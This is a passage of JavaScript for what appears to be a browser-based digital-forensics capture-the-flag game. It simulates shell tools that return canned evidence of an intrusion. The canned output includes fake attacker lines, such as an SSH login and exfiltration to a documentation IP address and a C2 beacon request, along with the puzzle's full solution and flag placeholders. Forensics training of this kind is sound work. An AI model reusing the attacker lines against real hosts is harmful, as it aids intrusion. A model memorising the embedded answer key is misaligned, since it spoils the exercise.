                return 'server_wipe_partial.dd  MD5: 8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d\nnetwork_fragment.pcap   MD5: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\nmemory_corrupt.raw      MD5: f0e1d2c3b4a5968778695a4b3c2d1e0f\nlog_corrupt.zip         MD5: 5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f';
            }

            return `cat: ${file}: No such file or directory`;
        },

        'grep': function(args) {
            const pattern = args.find(a => !a.startsWith('-')) || '';
            if (!pattern) return 'Usage: grep [options] <pattern> [file...]';

            const files = args.filter(a => !a.startsWith('-') && a !== pattern);
            const hasR = args.includes('-r') || args.includes('-R') || args.includes('-ri');

            if (pattern.toLowerCase().includes('spectr3') || pattern.includes('spectr3_v0id')) {
                return `server_wipe_partial.dd: ssh spectr3_v0id@198.51.100.77 -i /tmp/.s3rv/id_rsa
network_fragment.pcap: X-Agent-ID: spectr3_v0id
network_fragment.pcap: GET /cmd?id=spectr3_v0id&action=exfil
memory_corrupt.raw: SPECTR3_AGENT_ID=spectr3_v0id
memory_corrupt.raw: spectr3_implant
logs/syslog: Jan 10 09:21:50 aether-core kernel: [SPECTR3] module loaded (hidden)

[!] "spectr3_v0id" found in 4 of 4 artifact sources — HIGH CONFIDENCE attacker ID

[+] ATTACKER IDENTIFIED — User flag earned:
{{FLAG:user}}`;
            }

            if (pattern.includes('OVERRIDE') || pattern.includes('override') || pattern.toLowerCase().includes('frag')) {
                return `server_wipe_partial.dd: OVERRIDE_FRAG_1=4d454c54
network_fragment.pcap: OVERRIDE_FRAG_2=444f574e
memory_corrupt.raw: OVERRIDE_FRAG_3=5f434f4445
logs/webserver.log: OVERRIDE_FRAG_4=5f4f564552

[!] 4 of 5 override fragments found — Fragment 5 requires XOR decoding
[!] XOR key 0x42 found in network capture frame 52
[!] Encrypted blob at frame 48: 10070704030705747534
[!] After XOR with 0x42: OVERRIDE_FRAG_5=524944455f3732`;
            }

            if (pattern.includes('198.51.100') || pattern.includes('c2') || pattern.includes('C2')) {
                return `logs/auth.log: Accepted publickey for root from 198.51.100.77 port 44231
logs/syslog: exfil.py: Exfiltrating to 198.51.100.77:8443
logs/webserver.log: 198.51.100.77 multiple access entries
network_fragment.pcap: TCP connections to 198.51.100.77:8443
memory_corrupt.raw: SPECTR3_C2=198.51.100.77:8443`;
            }

            if (pattern.includes('false') || pattern.includes('inject') || pattern.toLowerCase().includes('10.0.0')) {
                return `logs/auth.log: [FALSE POSITIVE INJECTED] Jan 10 09:22:00 sshd[99999]: Failed password for admin from 10.0.0.1
logs/auth.log: [FALSE POSITIVE INJECTED] Jan 10 09:22:01 sshd[99998]: Failed password for admin from 10.0.0.2

[!] These are INJECTED false positives — PIDs 99999/99998 are impossibly high
[!] Source IPs 10.0.0.x are internal and not the real attacker`;
            }

            return `grep: no matches for '${pattern}'`;
        },

        'python3': function(args) {
            const code = args.join(' ');

            if (code.includes('hex') || code.includes('decode') || code.includes('unhexlify') || code.includes('fromhex')) {
                if (code.includes('4d454c54444f574e5f434f44455f4f564552524944455f3732') ||
                    (code.includes('4d454c54') && code.includes('444f574e'))) {
                    return 'MELTDOWN_CODE_OVERRIDE_72\n\n[+] OVERRIDE CODE RECONSTRUCTED — Root flag earned:\n{{FLAG:root}}';
                }
                if (code.includes('4d454c54')) return 'MELT';
                if (code.includes('444f574e')) return 'DOWN';
                if (code.includes('5f434f4445')) return '_CODE';
                if (code.includes('5f4f564552')) return '_OVER';
                if (code.includes('524944455f3732')) return 'RIDE_72';
            }

            if (code.includes('xor') || code.includes('XOR') || code.includes('0x42')) {
                return `XOR decoding with key 0x42:
Input:  10070704030705747534 (hex)
Output: 524944455f3732 (hex)
Decoded: RIDE_72

Fragment 5: OVERRIDE_FRAG_5=524944455f3732`;
            }

            return 'Python 3.11.6';
        },

        'xxd': function(args) {
            const file = args.find(a => !a.startsWith('-')) || '';
            if (file.includes('server_wipe')) {
                return `00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
[WIPED — sectors 0-2047 overwritten with zeros]
...
C0000000: 5350 4543 5452 332d 4652 414d 4557 4f52  SPECTR3-FRAMEWOR
C0000010: 4b2d 7634 2e32 2069 6e69 7469 616c 697a  K-v4.2 initializ
C0000020: 6564 0a72 6f6f 743a 2436 2478 797a 2448  ed.root:$6$xyz$H
C0000030: 4153 4845 445f 5041 5353 574f 5244 3a31  ASHED_PASSWORD:1`;
            }
            return `xxd: ${file}: No such file or directory`;
        },

        'foremost': function(args) {
            if (args.length === 0) return 'Usage: foremost [-t type] -i <input> [-o <output>]';

            return `Foremost version 1.5.7
Processing: server_wipe_partial.dd
|*************************************|

txt:  3 files recovered (partial — most sectors wiped)
  recovered/txt/00000001.txt: SSH command fragments
  recovered/txt/00000002.txt: Crontab entry with beacon.sh
  recovered/txt/00000003.txt: OVERRIDE_FRAG_1=4d454c54

elf:  1 file recovered
  recovered/elf/00000001.elf: spectr3_implant binary (partial)

Foremost finished. 4 FILES EXTRACTED
WARNING: Extensive wiping detected — recovery rate approximately 12%`;
        },

        'testdisk': function(args) {
            return `TestDisk 7.2
Disk server_wipe_partial.dd - 4294 MB / 4096 MiB

Analyse:
  [Partition 1] Linux ext4 — SEVERELY DAMAGED
    ~88% of sectors overwritten with zeros
    Surviving data concentrated in sectors 0xC0000000-0xC0100000
    File carving recommended for remaining data

No recoverable partition table found.`;
        },

        'log2timeline': function(args) {
            if (args.length === 0) return 'Usage: log2timeline.py <output.plaso> <source>';

            return `log2timeline - plaso 20230717

Processing sources...
[auth.log]     8 events (2 corrupted, 2 false positives marked)
[syslog]       7 events (2 corrupted, 1 binary injection)
[webserver.log] 6 events (12 entries missing/deleted)

Timeline events: 21 total
  Corrupted: 6 (marked with [CORRUPTED])
  False positives: 2 (marked with [FALSE POSITIVE])
  Reliable: 13

Key findings:
  09:20:15 — First attacker activity (webserver)
  09:21:44 — SSH access from 198.51.100.77
  09:24:00 — Anti-forensic wiper deployed
  Total attack duration: ~4 minutes before wiper activation`;
        },

        'md5sum': function(args) {
            const file = args[0] || '';
            if (file.includes('server_wipe')) return '8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d  server_wipe_partial.dd';
            if (file.includes('network_fragment')) return '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d  network_fragment.pcap';
            if (file.includes('memory_corrupt')) return 'f0e1d2c3b4a5968778695a4b3c2d1e0f  memory_corrupt.raw';
            if (file.includes('log_corrupt')) return '5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f  log_corrupt.zip';
            return `md5sum: ${file}: No such file or directory`;
        },

        'sha256sum': function(args) {
            const file = args[0] || '';
            if (file.includes('server_wipe')) return 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2  server_wipe_partial.dd';
            return `sha256sum: ${file}: No such file or directory`;
        },

        'ls': function(args) {
            const hasL = args.includes('-la') || args.includes('-l');
            const path = args.find(a => !a.startsWith('-')) || '.';

            if (path === '.' || path.includes('aether-incident')) {
                if (hasL) {
                    return `total 12894208
drwxr-xr-x 4 forensicator forensicator       4096 Jan 15 10:00 .
drwxr-xr-x 3 forensicator forensicator       4096 Jan 15 09:00 ..
-rw-r--r-- 1 forensicator forensicator 4294967296 Jan 10 10:00 server_wipe_partial.dd
-rw-r--r-- 1 forensicator forensicator   52428800 Jan 10 10:00 network_fragment.pcap
-rw-r--r-- 1 forensicator forensicator 8589934592 Jan 10 10:00 memory_corrupt.raw
-rw-r--r-- 1 forensicator forensicator    2097152 Jan 10 10:00 log_corrupt.zip
-rw-r--r-- 1 forensicator forensicator       1024 Jan 15 10:00 case_notes.txt
-rw-r--r-- 1 forensicator forensicator        512 Jan 15 10:00 hashes.txt
-rw-r--r-- 1 forensicator forensicator        768 Jan 15 10:00 timeline.txt
drwxr-xr-x 2 forensicator forensicator       4096 Jan 15 10:00 recovered
drwxr-xr-x 2 forensicator forensicator       4096 Jan 15 10:00 logs`;
                }
                return `server_wipe_partial.dd  network_fragment.pcap  memory_corrupt.raw
log_corrupt.zip  case_notes.txt  hashes.txt  timeline.txt
recovered/  logs/`;
            }

            if (path.includes('logs')) {
                return `auth.log  syslog  webserver.log`;
            }

            return `ls: cannot access '${path}': No such file or directory`;
        },

        'ping': function(args) {
            return 'ping: network is unreachable (forensic workstation is air-gapped)';
        },

        'mount': function(args) {
            if (args.length === 0) return 'Usage: mount <device> <mountpoint>';
            return 'mount: cannot mount — disk image too heavily corrupted for direct mounting.\nUse file carving tools (foremost, scalpel) instead.';
        },

        'dd': function(args) {
            return `4194304+0 records in\n4194304+0 records out\nCopy completed.`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#9333ea; border-bottom:2px solid #333; background:rgba(147,51,234,0.1);">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #222;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
